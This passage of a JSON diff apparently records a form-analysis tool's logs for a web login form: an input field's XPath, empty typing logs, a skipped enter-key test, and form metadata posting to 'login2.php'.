+              "type": "number",
+              "xpath": "/html/body/div[3]/div/div[3]/form/fieldset/div/div/ul/li[5]/input",
+              "typing_log": [],
+              "backspace_log": {},
+              "other_log": {},
+              "classification": ""
+            }
+          ],
+          "submit_log": {
+            "enter_key_test": {
+              "skipped": true,
+              "reason": "network_only"
+            },
+            "enter_key_logs": {},
+            "native_submit": {
+              "form_meta": {
+                "action": "login2.php",
+                "enctype": "application/x-www-form-urlencoded",
+                "id": "form1",
+                "method": "POST",
+                "name": 
